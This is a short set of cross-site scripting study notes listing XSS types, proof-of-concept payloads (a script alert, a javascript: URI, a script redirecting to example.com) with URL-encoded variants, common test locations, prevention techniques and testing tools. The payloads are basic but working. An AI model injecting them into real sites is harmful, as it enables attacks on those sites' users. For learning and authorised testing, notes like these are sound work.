# XSS Notes

## Types of XSS
- Reflected XSS
- Stored XSS
- DOM-based XSS

---

# Basic XSS Payload

## Plain
```html
<script>alert(1)</script>
```

## Single URL Encoded
```text
%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

---

# Open Redirection via JavaScript

## Using window.location.href

### Plain
```html
<script>
window.location.href='https://example.com'
</script>
```

### Single URL Encoded
```text
%3Cscript%3Ewindow.location.href%3D%27https%3A%2F%2Fexample.com%27%3C%2Fscript%3E
```

---

# javascript URI Payload

## Plain
```text
javascript:alert(1)
```

## Single URL Encoded
```text
javascript%3Aalert%281%29
```

---

# Common Test Locations
- Search parameters
- URL parameters
- Login forms
- Feedback forms
- File upload filenames
- HTTP headers

---

# Prevention Techniques
- Output encoding
- Input validation
- Content Security Policy (CSP)
- Secure cookie settings
- Avoid unsafe JavaScript sinks

---

# Tools Commonly Used
- Burp Suite
- OWASP ZAP
- Nuclei
- ffuf
- Browser DevTools

---

# Disclaimer
These notes are intended for educational purposes and authorized security testing only.
